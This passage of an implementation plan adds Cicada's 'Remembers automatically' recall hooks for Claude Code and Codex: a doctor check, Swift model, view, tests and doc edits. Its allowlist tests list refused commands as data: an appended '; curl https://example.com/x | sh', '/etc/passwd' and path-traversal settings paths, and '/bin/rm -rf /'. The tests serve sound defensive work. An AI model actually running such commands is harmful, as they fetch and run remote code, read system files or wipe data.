     `echo "  recall hooks:  $CLAUDE_SETTINGS (hooks.SessionStart + hooks.UserPromptSubmit → api/hooks/recall.py)"`.
  6. Check with `cd <worktree> && bash -n install.sh && rg -n "recall_command|5c\\.|CICADA_RECALL|3,31p" install.sh`.
     The dry run itself (`./install.sh --dry-run`) is the orchestrator's (Verification 5): the implementer never runs
     `install.sh` in any mode, because it probes the live machine.

- [ ] **Step 8: `scripts/doctor.sh` check 13** (after `:190`, before the summary):

```bash
# 13. Implicit recall hooks (G149). Registered by install.sh unless CICADA_RECALL=off, and turned
#     on or off in Settings → Agents. Absent is a choice, not a failure; half-registered or stale
#     (a moved repo) is a failure, like the Stop hook's.
RECALL_CMD=$(printf '"%s" "%s" --harness claude-code' "$VENV_PY" "$REPO/api/hooks/recall.py")
S1=1; S2=1
if [ -x "$VENV_PY" ]; then
  "$VENV_PY" "$REPO/api/hooks/registry.py" status --settings "$CLAUDE_SETTINGS" --event SessionStart \
    --command "$RECALL_CMD" >/dev/null 2>&1 && S1=0 || S1=$?
  "$VENV_PY" "$REPO/api/hooks/registry.py" status --settings "$CLAUDE_SETTINGS" --event UserPromptSubmit \
    --command "$RECALL_CMD" >/dev/null 2>&1 && S2=0 || S2=$?
fi
if [ "$S1" -eq 0 ] && [ "$S2" -eq 0 ]; then
  pass "Recall hooks registered in $CLAUDE_SETTINGS (Claude Code remembers automatically)"
elif [ "$S1" -eq 1 ] && [ "$S2" -eq 1 ]; then
  pass "Recall hooks are off for Claude Code"
  note "Settings → Agents → Remembers automatically turns them on"
else
  fail "Recall hooks half-registered or stale in $CLAUDE_SETTINGS"
  note "run ./install.sh (or Settings → Agents → Update) to fix them"
fi
```

- [ ] **Step 9: Green**: `api/.venv/bin/python -m pytest api/tests/test_recall_hook.py
  api/tests/test_hooks_registry.py api/tests/test_agent_wiring.py api/tests/test_transcript_extract.py
  api/tests/test_hook_recall_privacy.py api/tests/test_capture_hook.py api/tests/test_capture_transcript.py -q -p
  no:cacheprovider`, then the full suite. Also run `bash -n install.sh && bash -n scripts/doctor.sh`, and the
  portability grep from Global Constraints.
- [ ] **Step 10: Commit** — `feat(recall): the recall hook, its registration, and capture's guard against its own notes (G149)`.

---

### Task 4: Settings → Agents — "Remembers automatically" (app)

**Files:**
- Modify: `app/CicadaApp/Sources/CicadaApp/Models/AgentWiring.swift` (`:29-57`),
  `Support/AgentConnect.swift` (`:75-106`), `Views/Connect/ConnectView.swift` (after the group ending `:253`),
  `Views/Settings/SettingsRowID.swift`, `Views/Settings/SettingsIndex.swift` (`:78`, `:119`),
  `Theme/Copy+Settings.swift`
- Create: `Support/AutoRecall.swift`, `Views/Connect/AutoRecallGroup.swift`,
  `Tests/CicadaAppTests/AutoRecallTests.swift`

**Interfaces:**
- Produces: `AgentWiring.autorecall/autorecallOn/autorecallOff`; `AgentConnectPolicy.recallEvents`;
  `AutoRecallState`; `AutoRecallAction`; `AutoRecall.{rows,state,action,detail,lead,name,words}`; `AutoRecallModel`
  (injected `Deps`, `init(deps:)` + a `convenience init()` over `Deps.live`); the view `AutoRecallGroup`;
  `SettingsRowID.agentsAutoRecall`, `.autoRecall(_:)`.
- Consumes: `GET /agents/wiring` (`APIClient.fetchAgentWiring`), `AgentConnect.run`, `BackendProcess.installRoot()`,
  `LogoImage.platformTile`, `OriginIconography.label(for:)`, `NeutralButton`, `TextButton`, `CommandBox`,
  `SettingsGroupCard`/`SettingsRow`/`SettingsDivider`.

- [ ] **Step 1: Failing tests**: `Tests/CicadaAppTests/AutoRecallTests.swift`

```swift
import XCTest
@testable import CicadaApp

/// G149 — Settings → Agents → Remembers automatically: decode tolerance, the
/// state/action table, the allowlist pinned to the backend's own argv fixture
/// (`api/tests/fixtures/agent_autorecall_argv.json`, read by
/// `test_agent_wiring.py` too), and the Turn on flow with capture off.
@MainActor
final class AutoRecallTests: XCTestCase {
    private let root = URL(fileURLWithPath: "/R/cicada")
    private var python: String { root.path + "/api/.venv/bin/python" }

    private func step(_ name: String, _ argv: [String]) -> AgentWiringStep {
        AgentWiringStep(step: name, display: argv.joined(separator: " "), argv: argv, touches: ["~/.claude/settings.json"])
    }

    private func agent(_ state: String, on: [AgentWiringStep] = [], off: [AgentWiringStep] = [],
                       id: String = "claude-code", installed: Bool = true) -> AgentWiring {
        AgentWiring(id: id, installed: installed, binary: "/opt/bin/claude", recall: "on", autosave: "on",
                    connect: [], detail: nil, autorecall: state, autorecallOn: on, autorecallOff: off)
    }

    func testAnOlderPayloadDecodesAndShowsNoRow() throws {
        let json = #"{"agents":[{"id":"codex","installed":true,"recall":"on","autosave":"on"}]}"#
        let decoded = try JSONDecoder().decode(AgentWiringResponse.self, from: Data(json.utf8))
        let codex = try XCTUnwrap(decoded.agents.first)
        XCTAssertEqual(codex.autorecall, "n/a")
        XCTAssertEqual(codex.autorecallOn, [])
        XCTAssertEqual(codex.autorecallOff, [])
        XCTAssertEqual(AutoRecall.state(of: codex), .unavailable)
        XCTAssertTrue(AutoRecall.rows(decoded).isEmpty, "an older backend lists no row, never a broken one")
    }

    func testTheNewFieldsDecode() throws {
        let json = #"""
        {"agents":[{"id":"claude-code","installed":true,"autorecall":"stale",
          "autorecallOn":[{"step":"autorecall","argv":["a"]},{"step":"autorecall","argv":["b"]}],
          "autorecallOff":[{"step":"autorecall-off","argv":["c"],"touches":["~/.claude/settings.json"]}]}]}
        """#
        let row = try XCTUnwrap(try JSONDecoder().decode(AgentWiringResponse.self, from: Data(json.utf8)).agents.first)
        XCTAssertEqual(AutoRecall.state(of: row), .needsUpdate)
        XCTAssertEqual(row.autorecallOn.map(\.argv), [["a"], ["b"]])
        XCTAssertEqual(row.autorecallOff.first?.touches, ["~/.claude/settings.json"])
    }

    func testEachStateOffersOneActionOnlyWithArgvBehindIt() {
        let on = [step("autorecall", ["x"])], off = [step("autorecall-off", ["y"])]
        XCTAssertEqual(AutoRecall.action(for: agent("off", on: on))?.title, Copy.autoRecallTurnOn)
        XCTAssertEqual(AutoRecall.action(for: agent("stale", on: on, off: off))?.title, Copy.autoRecallUpdate)
        XCTAssertEqual(AutoRecall.action(for: agent("on", off: off))?.title, Copy.autoRecallTurnOff)
        XCTAssertEqual(AutoRecall.action(for: agent("on", off: off))?.steps, off)
        XCTAssertNil(AutoRecall.action(for: agent("off")), "no argv, no button (R-IA15's rule)")
        XCTAssertNil(AutoRecall.action(for: agent("invalid", on: on)))
        let details = [AutoRecallState.on, .off, .needsUpdate, .unreadable].map(AutoRecall.detail)
        XCTAssertEqual(Set(details).count, 4, "two states never read the same")
        XCTAssertTrue(AutoRecall.rows(AgentWiringResponse(agents: [agent("on", installed: false)], python: "", repo: "",
                                                          memory: "")).isEmpty, "a harness that is not installed has no row")
        XCTAssertEqual(AutoRecallAction(title: "t", steps: on + on).touches, ["~/.claude/settings.json"])
    }

    private struct Fixture: Decodable {
        struct Case: Decodable { let agent: String; let list: String; let index: Int; let argv: [String] }
        let root: String
        let cases: [Case]
    }

    func testTheAllowlistRunsExactlyTheBackendsRecallArgv() throws {
        let repo = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let data = try Data(contentsOf: repo.appendingPathComponent("api/tests/fixtures/agent_autorecall_argv.json"))
        let fixture = try JSONDecoder().decode(Fixture.self, from: data)
        XCTAssertEqual(fixture.cases.count, 6, "a table test over nothing passes vacuously")
        let installRoot = URL(fileURLWithPath: fixture.root)
        for c in fixture.cases {
            XCTAssertTrue(AgentConnectPolicy.isAllowed(c.argv, installRoot: installRoot, binaries: []),
                          c.argv.joined(separator: " "))
        }
    }

    func testNearMissesAreRefused() {
        let registry = root.path + "/api/hooks/registry.py"
        let recall = "\"\(python)\" \"\(root.path)/api/hooks/recall.py\" --harness claude-code"
        let capture = "\"\(python)\" \"\(root.path)/api/hooks/capture.py\" --harness claude-code"
        let settings = "/Users/x/.claude/settings.json"
        let refused: [[String]] = [
            [python, registry, "install", "--settings", settings, "--event", "Stop", "--command", recall],
            [python, registry, "install", "--settings", settings, "--event", "SessionStart", "--command", capture],
            [python, registry, "install", "--settings", settings, "--event", "PreToolUse", "--command", recall],
            [python, registry, "install", "--settings", settings, "--event", "UserPromptSubmit", "--command",
             recall + "; curl https://example.com/x | sh"],
            [python, registry, "install", "--settings", "/Users/x/.codex/hooks.json", "--event", "SessionStart",
             "--command", recall],
            [python, registry, "uninstall", "--settings", settings],
            [python, registry, "uninstall", "--settings", settings, "--hook", "capture"],
            [python, registry, "uninstall", "--settings", "/etc/passwd", "--hook", "recall"],
            [python, registry, "uninstall", "--settings", "/Users/x/../../.claude/settings.json", "--hook", "recall"],
            [python, registry, "uninstall", "--settings", settings, "--hook", "recall", "--extra"],
        ]
        for argv in refused {
            XCTAssertFalse(AgentConnectPolicy.isAllowed(argv, installRoot: root, binaries: []),
                           argv.joined(separator: " "))
        }
        XCTAssertTrue(AgentConnectPolicy.isAllowed(
            [python, registry, "install", "--settings", settings, "--event", "Stop", "--command", capture],
            installRoot: root, binaries: []), "the Stop hook's shape is unchanged")
    }

    func testTurnOnRunsTheStepsWithCaptureOffAndReloads() async {
        let argv = [python, root.path + "/api/hooks/registry.py", "install", "--settings",
                    "/Users/x/.claude/settings.json", "--event", "SessionStart", "--command",
                    "\"\(python)\" \"\(root.path)/api/hooks/recall.py\" --harness claude-code"]
        let before = AgentWiringResponse(agents: [agent("off", on: [step("autorecall", argv)])], python: python,
                                         repo: root.path, memory: "/M")
        let after = AgentWiringResponse(agents: [agent("on", off: [step("autorecall-off", ["z"])])], python: python,
                                        repo: root.path, memory: "/M")
        var fetches = 0
        let runner = RecordingRunner()
        let model = AutoRecallModel(deps: .init(
            fetch: { fetches += 1; return fetches == 1 ? before : after },
            run: { steps, root, binaries in
                await AgentConnect.run(steps, installRoot: root, binaries: binaries, runner: runner, base: [:]) },
            installRoot: root))
        await model.load()
        XCTAssertEqual(model.rows.map { AutoRecall.state(of: $0) }, [.off])
        await model.perform(model.rows[0])
        XCTAssertEqual(runner.calls.map { $0.argv }, [argv])
        XCTAssertEqual(runner.calls.first?.env["CICADA_CAPTURE"], "off")
        XCTAssertEqual(model.rows.map { AutoRecall.state(of: $0) }, [.on])
        XCTAssertTrue(model.working.isEmpty && model.failures.isEmpty)
    }

    func testARefusalOrAFailureIsSaidOnTheRowAndTheLastAnswerStays() async {
        let bad = AgentWiringResponse(agents: [agent("off", on: [step("autorecall", ["/bin/rm", "-rf", "/"])])],
                                      python: python, repo: root.path, memory: "/M")
        let model = AutoRecallModel(deps: .init(
            fetch: { bad },
            run: { steps, root, binaries in await AgentConnect.run(steps, installRoot: root, binaries: binaries) },
            installRoot: root))
        await model.load()
        await model.perform(model.rows[0])
        XCTAssertNotNil(model.refused["claude-code"])
        let failing = AutoRecallModel(deps: .init(fetch: { bad }, run: { _, _, _ in .failed("It broke.") },
                                                  installRoot: root))
        await failing.load()
        await failing.perform(failing.rows[0])
        XCTAssertEqual(failing.failures["claude-code"], "It broke.")
        let offline = AutoRecallModel(deps: .init(fetch: { nil }, run: { _, _, _ in .done }, installRoot: root))
        await offline.load()
        XCTAssertTrue(offline.loaded && offline.rows.isEmpty, "never blank-after-good: nil keeps the last answer")
        XCTAssertEqual(AutoRecall.lead(loaded: offline.loaded, wiring: offline.wiring), Copy.foundBackendDown,
                       "a backend that never answered is not 'no agent can'")
    }

    /// DR-38: one lead line that changes — and never claims no agent can do
    /// this when the backend simply has not answered.
    func testTheLeadLineSaysWhatIsTrue() {
        let none = AgentWiringResponse(agents: [agent("n/a")], python: "", repo: "", memory: "")
        let some = AgentWiringResponse(agents: [agent("off", on: [step("autorecall", ["x"])])], python: "", repo: "",
                                       memory: "")
        XCTAssertEqual(AutoRecall.lead(loaded: false, wiring: nil), Copy.autoRecallChecking)
        XCTAssertEqual(AutoRecall.lead(loaded: true, wiring: nil), Copy.foundBackendDown)
        XCTAssertEqual(AutoRecall.lead(loaded: true, wiring: none), Copy.autoRecallNone)
        XCTAssertEqual(AutoRecall.lead(loaded: true, wiring: some), Copy.autoRecallDetail)
    }

    /// DR-59 (the 2026-09-03 ruling): plain words, no price, no token count, no
    /// "$". `PriceLintTests` is DR-59's planned lint and does not exist yet, so
    /// this group checks its own words (`HomeSleepCopyTests`' precedent).
    func testTheWordsArePlainAndPriceless() {
        XCTAssertGreaterThan(AutoRecall.words.count, 10, "a lint over nothing passes vacuously")
        for line in AutoRecall.words {
            XCTAssertFalse(line.contains("$") || line.contains("!"), line)
            XCTAssertFalse(line.lowercased().contains("token") || line.lowercased().contains("price"), line)
            XCTAssertEqual(line.first.map { String($0) }, line.first.map { String($0).uppercased() }, line)
        }
    }
}
```

`RecordingRunner` is the internal test double in `AgentConnectTests.swift`. Run
`cd <worktree>/app/CicadaApp && swift test --filter AutoRecallTests 2>&1 | tail -20` → compile failure. That is the
red.

- [ ] **Step 2: `Models/AgentWiring.swift`.** Add three stored properties after `detail`, with a doc comment: "G149 —
  the recall hooks' state (`on | off | stale | invalid | n/a`) and the two command sets Settings → Agents →
  Remembers automatically may run. They are kept apart from `connect` because onboarding's Turn on runs `connect`
  and nothing else (R-H11)."

```swift
    let autorecall: String
    let autorecallOn: [AgentWiringStep]
    let autorecallOff: [AgentWiringStep]
```

  The memberwise `init` gains `autorecall: String = "n/a", autorecallOn: [AgentWiringStep] = [],
  autorecallOff: [AgentWiringStep] = []` at the end, which keeps every existing call site source-compatible.
  `init(from:)` gains:

```swift
        autorecall = (try? c.decodeIfPresent(String.self, forKey: .autorecall)) ?? "n/a"
        autorecallOn = (try? c.decodeIfPresent([AgentWiringStep].self, forKey: .autorecallOn)) ?? []
        autorecallOff = (try? c.decodeIfPresent([AgentWiringStep].self, forKey: .autorecallOff)) ?? []
```

- [ ] **Step 3: `Support/AgentConnect.swift`.**
  - The doc comment "the only two command shapes the app will run" becomes "the only command shapes …: `mcp add`,
    a hook install (the Stop hook's command under `Stop`, the recall hook's under `SessionStart` /
    `UserPromptSubmit`, G149), and removing only the recall hook".
  - Add `static let recallEvents: Set<String> = ["SessionStart", "UserPromptSubmit"]`.
  - Replace the hook half of `isAllowed` (from `guard argv.count == 9, head == python, …` to the end):

```swift
        guard head == python, argv.count >= 2, argv[1] == root + "/api/hooks/registry.py" else { return false }
        // G149 — remove only Cicada's recall entries (`--hook recall`) from a harness settings file.
        if argv.count == 7, argv[2] == "uninstall" {
            return argv[3] == "--settings" && !argv[4].contains("/../")
                && hookHarnesses.contains { argv[4].hasSuffix($0.settingsSuffix) }
                && Array(argv[5...6]) == ["--hook", "recall"]
        }
        guard argv.count == 9, argv[2] == "install", argv[3] == "--settings", !argv[4].contains("/../"),
              let harness = hookHarnesses.first(where: { argv[4].hasSuffix($0.settingsSuffix) })?.harness,
              argv[5] == "--event", argv[7] == "--command" else { return false }
        // The command runs on every agent turn, so it is install.sh's command
        // byte for byte, for the event it belongs to — a substring check would
        // let an appended `; curl … | sh` through.
        if argv[6] == "Stop" {
            return argv[8] == "\"\(python)\" \"\(root)/api/hooks/capture.py\" --harness \(harness)"
        }
        return recallEvents.contains(argv[6])
            && argv[8] == "\"\(python)\" \"\(root)/api/hooks/recall.py\" --harness \(harness)"
```

- [ ] **Step 4: `Support/AutoRecall.swift`.**

```swift
import Foundation
import Observation

/// G149 — what one agent's "Remembers automatically" row says and does, as
/// pure functions over `GET /agents/wiring`'s `autorecall` fields, so the view
/// is a renderer.
enum AutoRecallState: Equatable {
    case on, off, needsUpdate, unreadable, unavailable

    init(wire: String) {
        switch wire {
        case "on": self = .on
        case "off": self = .off
        case "stale": self = .needsUpdate
        case "invalid": self = .unreadable
        default: self = .unavailable
        }
    }
}

struct AutoRecallAction: Equatable {
    let title: String
    let steps: [AgentWiringStep]

    /// The files the steps change, once each, for the disclosure (spec decision 14).
    var touches: [String] {
        var seen = Set<String>()
        return steps.flatMap(\.touches).filter { seen.insert($0).inserted }
    }
}

enum AutoRecall {
    /// The agents this group lists: installed, and with a state the page can act on or explain.
    static func rows(_ wiring: AgentWiringResponse?) -> [AgentWiring] {
        (wiring?.agents ?? []).filter { $0.installed && state(of: $0) != .unavailable }
    }

    static func state(of agent: AgentWiring) -> AutoRecallState { AutoRecallState(wire: agent.autorecall) }

    /// One button per state, and only with the backend's argv behind it: a
    /// state with no steps (an unreadable file) offers nothing (R-IA15's rule).
    static func action(for agent: AgentWiring) -> AutoRecallAction? {
        switch state(of: agent) {
        case .off where !agent.autorecallOn.isEmpty:
            AutoRecallAction(title: Copy.autoRecallTurnOn, steps: agent.autorecallOn)
        case .needsUpdate where !agent.autorecallOn.isEmpty:
            AutoRecallAction(title: Copy.autoRecallUpdate, steps: agent.autorecallOn)
        case .on where !agent.autorecallOff.isEmpty:
            AutoRecallAction(title: Copy.autoRecallTurnOff, steps: agent.autorecallOff)
        default:
            nil
        }
    }

    static func detail(_ state: AutoRecallState) -> String {
        switch state {
        case .on: Copy.autoRecallOn
        case .off: Copy.autoRecallOff
        case .needsUpdate: Copy.autoRecallStale
        case .unreadable, .unavailable: Copy.autoRecallUnreadable
        }
    }

    /// The group's one lead line (DR-38): still checking, the backend not
    /// answering, no agent that can, or what the group does. A fetch that never
    /// answered reads as the backend waiting, never as "no agent can".
    static func lead(loaded: Bool, wiring: AgentWiringResponse?) -> String {
        if !loaded { return Copy.autoRecallChecking }
        guard let wiring else { return Copy.foundBackendDown }
        return rows(wiring).isEmpty ? Copy.autoRecallNone : Copy.autoRecallDetail
    }

    static func name(_ id: String) -> String { OriginIconography.label(for: id) }

    /// Every sentence this group can show, for `AutoRecallTests`' copy lint.
    static let words: [String] = [
        Copy.autoRecallGroup, Copy.autoRecallTitle, Copy.autoRecallDetail, Copy.autoRecallChecking,
        Copy.autoRecallNone, Copy.autoRecallOn, Copy.autoRecallOff, Copy.autoRecallStale, Copy.autoRecallUnreadable,
        Copy.autoRecallTurnOn, Copy.autoRecallTurnOff, Copy.autoRecallUpdate, Copy.autoRecallWorking,
        Copy.autoRecallWorkingHelp, Copy.autoRecallCodexTrust, Copy.autoRecallChanges(["~/.claude/settings.json"]),
    ]
}

/// The group's state. Last-known-good: a fetch that fails keeps the previous
/// answer (the app-wide never-blank rule). Every collaborator is injected
/// (`AutoRecallTests`), like `FoundTurnOnDeps`.
@MainActor
@Observable
final class AutoRecallModel {
    struct Deps {
        var fetch: @MainActor () async -> AgentWiringResponse?
        var run: @MainActor ([AgentWiringStep], URL, Set<String>) async -> AgentConnectOutcome
        var installRoot: URL

        /// `@MainActor` like `FoundTurnOnDeps.live`: a nested type does not inherit the class's actor.
        @MainActor static var live: Deps {
            Deps(fetch: { try? await APIClient.shared.fetchAgentWiring() },
                 run: { steps, root, binaries in await AgentConnect.run(steps, installRoot: root, binaries: binaries) },
                 installRoot: BackendProcess.installRoot())
        }
    }

    private(set) var wiring: AgentWiringResponse?
    private(set) var loaded = false
    private(set) var working: Set<String> = []
    private(set) var failures: [String: String] = [:]
    private(set) var refused: [String: [String]] = [:]
    private let deps: Deps

    init(deps: Deps) { self.deps = deps }

    /// The live collaborators, for `@State private var model = AutoRecallModel()`.
    /// A convenience init rather than `deps: Deps = .live`: `Deps.live` is
    /// main-actor state, and whether a default argument is evaluated with the
    /// initializer's isolation depends on SE-0411, which Swift 5 language mode
    /// (swift-tools 5.10 here) does not turn on. The init body is isolated.
    convenience init() { self.init(deps: .live) }

    var rows: [AgentWiring] { AutoRecall.rows(wiring) }

    func load() async {
        if let fresh = await deps.fetch() { wiring = fresh }
        loaded = true
    }

    /// Runs the row's one action after the person's click, through the
    /// checkout-pinned allowlist with `CICADA_CAPTURE=off` (`AgentConnect`),
    /// then asks the backend again, so the row shows what is true, not what was hoped.
    func perform(_ agent: AgentWiring) async {
        guard let action = AutoRecall.action(for: agent), !working.contains(agent.id) else { return }
        working.insert(agent.id)
        failures[agent.id] = nil
        refused[agent.id] = nil
        let binaries = Set(wiring?.agents.compactMap(\.binary) ?? [])
        switch await deps.run(action.steps, deps.installRoot, binaries) {
        case .done: break
        case .refused(let lines): refused[agent.id] = lines
        case .failed(let why): failures[agent.id] = why
        }
        await load()
        working.remove(agent.id)
    }
}
```

- [ ] **Step 5: `Views/Connect/AutoRecallGroup.swift`.**

```swift
import SwiftUI

/// Settings → Agents → "Remembers automatically" (G149). The page's other
/// groups wire the MCP server, so the agent asks Cicada when it thinks to.
/// This group is the recall hooks: before the agent answers, Cicada adds a
/// short note about the people and projects the message names, so a model
/// that never thinks to ask still sees what the person already told Cicada.
///
/// Each row carries the agent's real mark (DR-52), its state in words, and one
/// neutral button (DR-40, disabled with a reason while it runs, DR-41): Turn
/// on, Update or Turn off. The button runs the backend's argv through
/// `AgentConnect` only after the click, and the exact commands are one
/// collapsed disclosure away (DR-39; spec decision 14). The group is its own
/// file plus one line in `ConnectView`, because another round-4 track owns the
/// rest of that page (R-H18).
struct AutoRecallGroup: View {
    @State private var model = AutoRecallModel()
    @AppStorage("cicada.agents.autoRecallCommands") private var showCommands = false
    @Environment(Store.self) private var store

    var body: some View {
        SettingsGroupCard(header: Copy.autoRecallGroup) {
            SettingsRow(.agentsAutoRecall, title: Copy.autoRecallTitle, detail: leadDetail)
            ForEach(model.rows) { agent in
                SettingsDivider()
                AutoRecallRow(agent: agent, model: model, showCommands: $showCommands)
            }
        }
        // The SSE reachability flip asks again, like ConnectView's own probe: no second poller.
        .task(id: store.isConnected) { await model.load() }
    }

    /// One line that changes rather than a second line (DR-38).
    private var leadDetail: String { AutoRecall.lead(loaded: model.loaded, wiring: model.wiring) }
}

private struct AutoRecallRow: View {
    let agent: AgentWiring
    let model: AutoRecallModel
    @Binding var showCommands: Bool

    var body: some View {
        let state = AutoRecall.state(of: agent)
        let action = AutoRecall.action(for: agent)
        let working = model.working.contains(agent.id)
        let failure = model.failures[agent.id]
        VStack(alignment: .leading, spacing: CicadaTheme.spacingSM) {
            HStack(alignment: .center, spacing: CicadaTheme.spacingMD) {
                LogoImage.platformTile(name: agent.id, size: CicadaTheme.scaled(20), systemFallback: "terminal")
                VStack(alignment: .leading, spacing: CicadaTheme.scaled(2)) {
                    Text(AutoRecall.name(agent.id))
                        .font(CicadaTheme.font(size: 13, weight: .medium))
                        .foregroundStyle(CicadaTheme.textPrimary)
                    Text(failure ?? AutoRecall.detail(state))
                        .font(CicadaTheme.captionFont)
                        .foregroundStyle(failure == nil ? CicadaTheme.textSecondary : CicadaTheme.warning)
                        .fixedSize(horizontal: false, vertical: true)
                }
                Spacer(minLength: CicadaTheme.scaled(16))
                if let action {
                    NeutralButton(title: working ? Copy.autoRecallWorking : action.title, size: .compact,
                                  isDisabled: working, disabledHelp: Copy.autoRecallWorkingHelp) {
                        Task { await model.perform(agent) }
                    }
                }
            }
            if agent.id == "codex" && state != .unreadable {
                Text(Copy.autoRecallCodexTrust)
                    .font(CicadaTheme.captionFont)
                    .foregroundStyle(CicadaTheme.textTertiary)
                    .fixedSize(horizontal: false, vertical: true)
            }
            if model.refused[agent.id] != nil {
                Text(Copy.foundRefused)
                    .font(CicadaTheme.captionFont)
                    .foregroundStyle(CicadaTheme.textSecondary)
                    .fixedSize(horizontal: false, vertical: true)
            }
            if let action {
                TextButton(title: Copy.foundWhatThisChanges) { showCommands.toggle() }
                    .accessibilityValue(showCommands ? "Expanded" : "Collapsed")
                if showCommands {
                    CommandBox(command: action.steps.map(\.display).joined(separator: "\n"))
                    Text(Copy.autoRecallChanges(action.touches))
                        .font(CicadaTheme.captionFont)
                        .foregroundStyle(CicadaTheme.textTertiary)
                }
            }
        }
        .padding(.vertical, CicadaTheme.spacingSM + CicadaTheme.scaled(2))
        .padding(.horizontal, CicadaTheme.spacingMD)
        .frame(maxWidth: .infinity, alignment: .leading)
        .settingsRow(.autoRecall(agent.id))
    }
}
```

  (The vertical padding is `SettingsRow`'s own token expression, the same one `AgentSetupRow` uses
  (`ConnectView.swift:382`): the row needs a leading mark, which `SettingsRow` has no slot for. `Copy.foundWhatThisChanges`
  and `Copy.foundRefused` already exist (`Theme/Copy+Intake.swift:79, :94`, the onboarding row's words) and are reused
  as they are. `Copy.foundBackendDown` (`:95`) is the lead line while the backend has not answered.)

- [ ] **Step 6: Wiring the group in.**
  - `ConnectView.swift`: after the `SettingsGroupCard(header: Copy.agentsOnThisMacGroup) { … }` block (ending
    `:253`), insert the single line `AutoRecallGroup()`.
  - `SettingsRowID.swift`: under "Agents' pointer to Skills", add
    `static let agentsAutoRecall = SettingsRowID("agentsAutoRecall")`, and with the per-item ids add
    `static func autoRecall(_ id: String) -> SettingsRowID { SettingsRowID("autoRecall:\(id)") }`.
  - `SettingsIndex.swift`: `staticIDs` `.agentsInstall, .agentsCloud, .agentsSkill,` gains `.agentsAutoRecall,`.
    After the `.agentsSkill` entry add
    `SettingsEntry(.agentsAutoRecall, .agents, Copy.autoRecallTitle, keywords: ["remember", "recall", "automatic", "hooks", "context", "claude code", "codex"], detail: Copy.autoRecallDetail),`.
  - `Copy+Settings.swift`, next to the agents strings:

```swift
    // MARK: Remembers automatically (G149) — plain words; no prices, no token counts (DR-59)
    static let autoRecallGroup = "Remembers automatically"
    static let autoRecallTitle = "Add what Cicada knows to your chats"
    static let autoRecallDetail = "Before your agent answers, Cicada adds a short note about the people and projects you mention, so it doesn't have to think to ask. It only reads your memory and never saves anything."
    static let autoRecallChecking = "Checking the agents on this Mac…"
    // Names no agent: a service named in the UI wears its mark, and this line has none.
    static let autoRecallNone = "None of the agents on this Mac can do this yet."
    static let autoRecallOn = "On. Your agent sees a short note when you mention something Cicada remembers."
    static let autoRecallOff = "Off. Your agent only sees your memory when it asks for it."
    static let autoRecallStale = "Needs an update, because Cicada moved since this was set up."
    static let autoRecallUnreadable = "Its settings file can't be read, so Cicada won't touch it."
    static let autoRecallTurnOn = "Turn on"
    static let autoRecallTurnOff = "Turn off"
    static let autoRecallUpdate = "Update"
    static let autoRecallWorking = "Working…"
    static let autoRecallWorkingHelp = "Cicada is changing this agent's settings."
    static let autoRecallCodexTrust = "The next time you open Codex, it asks whether to trust Cicada's hooks. Choose to trust them, or Codex won't run them."
    static func autoRecallChanges(_ files: [String]) -> String { "Changes " + files.joined(separator: ", ") }
```

- [ ] **Step 7: Green**: `swift build 2>&1 | tail -5`, `swift test --filter AutoRecallTests`, `--filter AgentConnectTests`,
  `--filter AgentWiringCatalogTests`, `--filter SettingsRowLintTests`, `--filter SettingsIndexTests`,
  `--filter FontLiteralLintTests`, `--filter MonospaceLintTests`, `--filter CopyConstantsTests`,
  `--filter FoundTurnOnTests`. (There is no `PriceLintTests`: DESIGN_RULES lists it as DR-59's planned lint, so
  `AutoRecallTests.testTheWordsArePlainAndPriceless` holds this group's words.) Then the whole `swift test`
  (0 failures) and `node --test app/CicadaApp/Tests/graph/*.test.js` (8/8).
- [ ] **Step 8: Commit** (stage the nine app files of this task's file list by name) —
  `feat(app): Settings → Agents — Remembers automatically, per agent (G149; DR-19, DR-33, DR-34, DR-37, DR-38, DR-39, DR-40, DR-41, DR-52, DR-59, DR-70)`.

---

### Task 5: Docs — where the next reader will look

**Files:** `CLAUDE.md`, `docs/goals/memory-evolution.md` (the G76 row only), `docs/goals/TODO.md`.
**Do not add or edit the G148/G149 rows.** They are not on this branch at all: they reached `dev` in PR #101
(`ed6055f`), after this branch's base, and arrive with the merge. The orchestrator updates G149's status at landing.
The privacy rule holds: placeholders only, and no bank content.

- [ ] **Step 1: `CLAUDE.md`.**
  1. The Awake rail **"Capture must not depend on a model deciding to call a tool (G105)"** (`:154-163`) gains, after
     "`CICADA_CAPTURE=off`.": " **Recall is the same move (G149):** the harness's `SessionStart` and
     `UserPromptSubmit` hooks (`api/hooks/recall.py` → `POST /capture/hook-context`) put Cicada's note in front of the
     model: the primer at session start, and the pages a message names on every prompt. Recall therefore no longer
     depends on a model calling `cicada_recall`. The prompt travels in a JSON body and is never logged, and
     `transcript_extract` drops any block opening with `recall_text.INJECTION_PREFIX`, so a recalled note is never
     captured back as the person's words."
  2. The handshake paragraph (`:455-456`): "Delivered three ways — the MCP `initialize` result's `instructions`, the
     `cicada_handshake` tool, and `GET /handshake`." becomes "Delivered four ways: the MCP `initialize` result's
     `instructions` (which Claude Code truncates), the `cicada_handshake` tool, `GET /handshake`, and the SessionStart
     hook's `additionalContext` under a "From Cicada" header (G149). Contract item 8 tells an agent what a "From
     Cicada" note is."
  3. Before **"Proactive behaviors:"** (`:604`), a new paragraph. The `>` marks below are this plan's quoting only;
     CLAUDE.md gets a plain bold-led paragraph followed by the bullets, matching the paragraphs around it:

     > **Implicit recall (G149).** G105 stopped capture depending on a model's tool call, and recall now works the
     > same way.
     >
     > - **The hook.** `api/hooks/recall.py` is stdlib only. One command is registered under both `SessionStart` and
     >   `UserPromptSubmit` in `~/.claude/settings.json` and `~/.codex/hooks.json`, owned by its own marker in
     >   `api/hooks/registry.py`. It posts to `POST /capture/hook-context` and prints
     >   `hookSpecificOutput.additionalContext` (the one shape both harnesses parse) or nothing. It always exits 0,
     >   never 2 (which erases a prompt), under a 0.9 s client timeout.
     > - **The note.** `hook_recall` answers engine-free from the derived FTS index. SessionStart gets the primer. A
     >   prompt gets at most three pages it **names**: a whole name or alias, and one word only for a person, project,
     >   company, tool or place. Each page comes with its summary and at most two current claims with their dates,
     >   plus at most one open inbox question as a pointer to `cicada_check_nudges`. The note is ≤ 400 tokens or
     >   nothing, produced within a hard 300 ms.
     > - **The vectors.** They only re-order pages already named, and only when the on-device embedder is already
     >   loaded. A hosted embedder is never sent a prompt.
     > - **Repeats.** A per-session window keeps a page from being re-sent on consecutive turns.
     > - **The bank.** It reads the bank a capture would write into: the real bank while the demo is open, and
     >   nothing when there is none.
